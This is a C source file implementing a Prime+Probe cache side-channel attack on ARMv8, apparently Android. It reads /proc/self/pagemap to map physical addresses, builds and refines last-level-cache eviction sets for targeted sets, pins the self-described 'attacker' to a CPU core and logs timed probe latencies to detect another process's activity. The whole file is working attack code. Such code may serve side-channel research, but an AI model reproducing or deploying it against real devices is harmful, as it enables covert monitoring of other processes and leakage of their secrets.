#define _GNU_SOURCE 1
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <sys/mman.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>

#include "cache_sets.h"

// ===================== CONFIG =====================
#define CACHE_LINE_SIZE      64
#define PAGE_SIZE_BYTES      4096
#define LINES_PER_PAGE       (PAGE_SIZE_BYTES / CACHE_LINE_SIZE)

#define LLC_NUM_SETS         16384     
#define MAX_ADDRS_PER_SET    64
#define PRIME_WAYS           16        // per-set lines to touch (≈ associativity)
#define PROBE_REPS           20        // amplify miss latency; 

#define BUFFER_SIZE          (16 * 1024 * 1024)  // 64MB gives more candidates
#define MONITOR_DURATION_SEC 15.0
#ifndef SAMPLE_US
#define SAMPLE_US            7         // relax cadence a bit for stronger signal
#endif

#ifndef SPIKE_THRESH_TICKS
#define SPIKE_THRESH_TICKS 30ULL   // treat ≥30 ticks as a spike
#endif

// ==================================================

// Congruent addresses per target set
typedef struct {
    int count;
    volatile uint8_t* addrs[MAX_ADDRS_PER_SET];
} EvSet;

static EvSet g_evsets[NUM_CACHE_SETS];

// ---- ARMv8 counters ----
static inline uint64_t read_cntvct(void) { uint64_t c; __asm__ volatile("mrs %0, cntvct_el0" : "=r"(c)); return c; }
static inline uint64_t read_cntfrq(void) { uint64_t f; __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(f)); return f; }

// ---- pagemap helpers (DECLARE BEFORE USE) ----
static int vaddr_to_pfn(int pm_fd, void* vaddr, uint64_t* pfn_out) {
    const uint64_t vpn    = (uintptr_t)vaddr / PAGE_SIZE_BYTES;
    const off_t    offset = (off_t)vpn * 8;
    uint64_t entry;
    if (pread(pm_fd, &entry, 8, offset) != 8) return -1;
    if (!(entry & (1ULL << 63))) return -2;            // not present
    *pfn_out = entry & ((1ULL << 55) - 1);             // PFN bits
    return 0;
}
static inline uint32_t llc_set_index(uint64_t phys_addr) {
    uint64_t line = phys_addr >> 6;
    return (line ^ (line >> 15) ^ (line >> 23)) & (LLC_NUM_SETS - 1);
}

// ---- build eviction sets from our own buffer (PHYSICAL set match) ----
static void build_eviction_sets(uint8_t* buf, size_t buflen_bytes,
                                const int* targets, int ntargets) {
    for (int t = 0; t < ntargets; ++t) g_evsets[t].count = 0;

    int pm_fd = open("/proc/self/pagemap", O_RDONLY);
    if (pm_fd < 0) { perror("open(/proc/self/pagemap)"); return; }

    const size_t npages = buflen_bytes / PAGE_SIZE_BYTES;
    for (size_t p = 0; p < npages; ++p) {
        uint8_t* page_va = buf + p * PAGE_SIZE_BYTES;
        uint64_t pfn;
        if (vaddr_to_pfn(pm_fd, page_va, &pfn) != 0) continue;
        const uint64_t page_phys = (pfn << 12);

        for (int l = 0; l < LINES_PER_PAGE; ++l) {
            const uint64_t line_phys = page_phys + (uint64_t)l * CACHE_LINE_SIZE;
            const uint32_t set       = llc_set_index(line_phys);

            for (int t = 0; t < ntargets; ++t) {
                if ((uint32_t)hot_cache_sets[t] == set) {
                    EvSet* es = &g_evsets[t];
                    if (es->count < MAX_ADDRS_PER_SET) {
                        es->addrs[es->count++] = page_va + (size_t)l * CACHE_LINE_SIZE;
                    }
                    break;
                }
            }
        }
    }
    close(pm_fd);

    // Trim to PRIME_WAYS per set
    for (int t = 0; t < ntargets; ++t) {
        if (g_evsets[t].count > PRIME_WAYS) g_evsets[t].count = PRIME_WAYS;
    }
}

// ---- prime & probe using real congruent addresses ----
static inline void prime_eviction_sets(void) {
    for (int t = 0; t < NUM_CACHE_SETS; ++t) {
        EvSet* es = &g_evsets[t];
        for (int i = 0; i < es->count; ++i) { (void)*es->addrs[i]; }
    }
}
static inline uint64_t ticks_to_us(uint64_t dt, uint64_t cntfrq) {
    return (dt * 1000000ULL) / cntfrq;
}
static void probe_eviction_sets(FILE* log, uint64_t cntfrq, uint64_t t0_ticks, uint64_t boot_base_us) {
    uint64_t ts_ticks  = read_cntvct();
    uint64_t rel_ticks = ts_ticks - t0_ticks;
    uint64_t ts_us     = boot_base_us + ticks_to_us(rel_ticks, cntfrq);
    fprintf(log, "%llu", (unsigned long long)ts_us);

    for (int t = 0; t < NUM_CACHE_SETS; ++t) {
        EvSet* es = &g_evsets[t];
        volatile uint8_t sink = 0;
        uint64_t t0 = read_cntvct();
        for (int r = 0; r < PROBE_REPS; ++r) {
            for (int i = 0; i < es->count; ++i) sink ^= *es->addrs[i];
        }
        uint64_t t1 = read_cntvct();
        uint64_t lat_ticks = t1 - t0;
        fprintf(log, ", %llu", (unsigned long long)lat_ticks);
        (void)sink;
    }
    fputc('\n', log);
}

// Binary logging: write "timestamp_us, 0|1" and early-exit if any set spikes
static void probe_eviction_sets_binary(FILE* log, uint64_t cntfrq, uint64_t t0_ticks, uint64_t boot_base_us) {
    // Timestamp in µs since boot 
    uint64_t ts_ticks  = read_cntvct();
    uint64_t rel_ticks = ts_ticks - t0_ticks;
    uint64_t ts_us     = boot_base_us + (rel_ticks * 1000000ULL) / cntfrq;

    int spike = 0;
    volatile uint8_t sink = 0;

    // Probe each hot cache set; 
    for (int t = 0; t < NUM_CACHE_SETS; ++t) {
        EvSet* es = &g_evsets[t];
        if (es->count == 0) continue;

        uint64_t t0 = read_cntvct();
        for (int r = 0; r < PROBE_REPS; ++r) {
            for (int i = 0; i < es->count; ++i) {
                sink ^= *es->addrs[i];
            }
        }
        uint64_t t1 = read_cntvct();
        uint64_t lat_ticks = t1 - t0;

        if (lat_ticks >= SPIKE_THRESH_TICKS) {
            spike = 1;
            break; // early-exit: no need to probe remaining sets this iteration
        }
    }

    // Buffered I/O already set to 1MB, so no per-line flush overhead.
    fprintf(log, "%llu, %d\n", (unsigned long long)ts_us, spike);
    (void)sink; // prevent optimization
}


// ---- buffer ----
static inline uint8_t* allocate_buffer(void) {
    uint8_t* buf;
    if (posix_memalign((void**)&buf, CACHE_LINE_SIZE, BUFFER_SIZE) != 0) {
        perror("posix_memalign"); return NULL;
    }
    memset(buf, 0, BUFFER_SIZE);
    return buf;
}





// Greedy slice-aware refinement: keeps only addresses that measurably
// increase the probe latency when added to the current selection.
static void refine_same_slice(EvSet* es, int target_ways, uint64_t cntfrq) {
    if (es->count <= 2) return;

    // Measure baseline latency of touching one address repeatedly.
    volatile uint8_t sink = 0;
    uint64_t best_base = ~0ULL;
    
    for (int b = 0; b < es->count && b < 4; ++b) {
        uint64_t t0 = read_cntvct();
        for (int r = 0; r < 64; ++r) sink ^= *es->addrs[b];
        uint64_t t1 = read_cntvct();
        uint64_t dt = t1 - t0;
        if (dt < best_base) best_base = dt;
    }
    const uint64_t THR = best_base + 8; // 8 ticks over base ~ small miss bump

    // Greedy select
    volatile uint8_t* selected[MAX_ADDRS_PER_SET];
    int sel = 0;

    for (int i = 0; i < es->count; ++i) {
        // Prime current selection + candidate
        for (int k = 0; k < sel; ++k) (void)*selected[k];
        (void)*es->addrs[i];

        // Probe: walk selection + candidate a bit to see added conflict
        uint64_t t0 = read_cntvct();
        for (int r = 0; r < 16; ++r) {
            for (int k = 0; k < sel; ++k) sink ^= *selected[k];
            sink ^= *es->addrs[i];
        }
        uint64_t t1 = read_cntvct();
        uint64_t dt = t1 - t0;

        if (dt > THR) {
            selected[sel++] = es->addrs[i];
            if (sel >= target_ways) break;
        }
    }

    if (sel >= 2) {
        for (int k = 0; k < sel; ++k) es->addrs[k] = selected[k];
        es->count = sel;
    }
    (void)sink;
}

static void verify_eviction_sets(void) {
    fprintf(stderr, "Verifying eviction sets...\n");
    
    for (int t = 0; t < NUM_CACHE_SETS; ++t) {
        EvSet* es = &g_evsets[t];
        if (es->count < 2) {
            fprintf(stderr, "Set %d (cache set %d): SKIP - only %d addresses\n", 
                    t, hot_cache_sets[t], es->count);
            continue;
        }
        
        // Access first address 
        volatile uint8_t* test = es->addrs[0];
        *test;  // Load into cache
        
        // Prime with other addresses to try evicting it
        for (int i = 1; i < es->count; ++i) {
            (void)*es->addrs[i];
        }
        
        // Measuring if first address was evicted
        uint64_t t0 = read_cntvct();
        (void)*test;
        uint64_t t1 = read_cntvct();
        uint64_t latency = t1 - t0;
        
        // On ARM, cache hit is typically <50 ticks, miss is >100 ticks
        fprintf(stderr, "Set %d (cache set %d): %d addrs, latency=%llu ticks - %s\n", 
                t, hot_cache_sets[t], es->count, 
                (unsigned long long)latency,
                latency > 80 ? "GOOD (evicts)" : "BAD (no eviction)");
    }
    fprintf(stderr, "Verification complete.\n\n");
}



int main(void) {
    FILE *log = fopen("/data/local/tmp/spike_log.txt", "w");
    if (!log) { perror("fopen"); return 1; }
    setvbuf(log, NULL, _IOFBF, 1 << 20);  // 1MB buffered I/O

    // Pin attacker to CPU 7
    cpu_set_t set; CPU_ZERO(&set); CPU_SET(7, &set);
    sched_setaffinity(0, sizeof(set), &set);

    // NO SCHED_FIFO: avoid starving the system
    mlockall(MCL_CURRENT | MCL_FUTURE);

    uint8_t* buf = allocate_buffer();
    if (!buf) return 1;

    // Build eviction sets for target L3 sets
    build_eviction_sets(buf, BUFFER_SIZE, hot_cache_sets, NUM_CACHE_SETS);
    
    for (int t = 0; t < NUM_CACHE_SETS; ++t) {
        refine_same_slice(&g_evsets[t], PRIME_WAYS, read_cntfrq());

    }

    
    const uint64_t cntfrq = read_cntfrq();
    const uint64_t delta_ticks = (uint64_t)(SAMPLE_US * 1e-6 * (double)cntfrq);
    const uint64_t t0_ticks = read_cntvct();

    struct timespec bt;
    clock_gettime(CLOCK_BOOTTIME, &bt);
    const uint64_t boot_base_us = (uint64_t)bt.tv_sec * 1000000ull + (uint64_t)bt.tv_nsec / 1000ull;

    uint64_t next_deadline = t0_ticks;
    const uint64_t end_ticks = t0_ticks + (uint64_t)(MONITOR_DURATION_SEC * (double)cntfrq);

    while (next_deadline < end_ticks) {
        prime_eviction_sets();
        next_deadline += delta_ticks;
        while ((int64_t)(next_deadline - read_cntvct()) > 0) { /* spin */ }
        probe_eviction_sets(log, cntfrq, t0_ticks, boot_base_us);

    }

    fclose(log);
    free((void*)buf);
    return 0;
}

